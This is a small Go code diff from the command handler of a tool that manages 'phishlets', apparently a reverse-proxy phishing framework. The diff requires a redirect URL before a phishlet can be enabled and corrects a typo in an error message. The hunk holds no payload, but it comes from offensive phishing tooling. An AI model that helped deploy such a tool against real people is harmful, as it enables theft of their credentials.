@@ -536,9 +536,12 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				log.Error("%v", err)
 				break
 			}
+			if !t.cfg.HasRedirectUrl() {
+				return fmt.Errorf("you need to set a redirect URL first. type: config redirect_url <url>")
+			}
 			domain, _ := t.cfg.GetSiteDomain(args[1])
 			if domain == "" {
-				return fmt.Errorf("you need to set hostname for phishlet '%s', first. type: phishlet hostname %s your.hostame.domain.com", args[1], args[1])
+				return fmt.Errorf("you need to set hostname for phishlet '%s', first. type: phishlets hostname %s your.hostame.domain.com", args[1], args[1])
 			}
 			err = t.cfg.SetSiteEnabled(args[1])
 			if err != nil {
